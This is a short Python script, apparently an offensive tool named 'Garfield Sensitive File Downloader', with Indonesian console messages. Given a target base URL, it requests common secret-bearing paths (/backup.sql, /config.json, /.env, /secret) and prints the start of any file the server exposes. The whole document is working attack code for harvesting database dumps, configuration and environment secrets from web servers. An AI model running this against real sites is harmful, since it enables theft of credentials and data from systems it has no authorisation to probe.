import requests
import argparse

TARGET_FILES = [
    "/backup.sql",
    "/config.json",
    "/.env",
    "/secret"
]

def check_and_download(base_url):
    print("=" * 50)
    print("⚡ GARFIELD SENSITIVE FILE DOWNLOADER v1.0")
    print(f"🎯 Target Base URL: {base_url}")
    print("=" * 50 + "\n")

    for file_path in TARGET_FILES:
        full_url = base_url.rstrip("/") + file_path
        print(f"[*] Mencoba mengunduh: {full_url}")
        
        try:
            response = requests.get(full_url, timeout=5)
            
            if response.status_code == 200:
                print(f"    [!] [BERHASIL DIAKSES] Status: 200 OK (Ukuran: {len(response.text)} bytes)")
                print("    --- [ 500 Karakter Pertama Konten ] ---")
                print(response.text[:500])
                print("    ---------------------------------------")
            elif response.status_code == 403:
                print(f"    [-] Ditolak (403 Forbidden)")
            elif response.status_code == 404:
                print(f"    [-] Tidak ditemukan (404 Not Found)")
            else:
                print(f"    [-] Status code: {response.status_code}")
                
        except Exception as e:
            print(f"    [X] Gagal terhubung: {e}")
        print("-" * 50)

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Sensitive File Downloader")
    parser.add_argument("-u", "--url", required=True, help="Base URL target (cth: http://127.0.0.1:8080)")
    args = parser.parse_args()
    
    check_and_download(args.url)
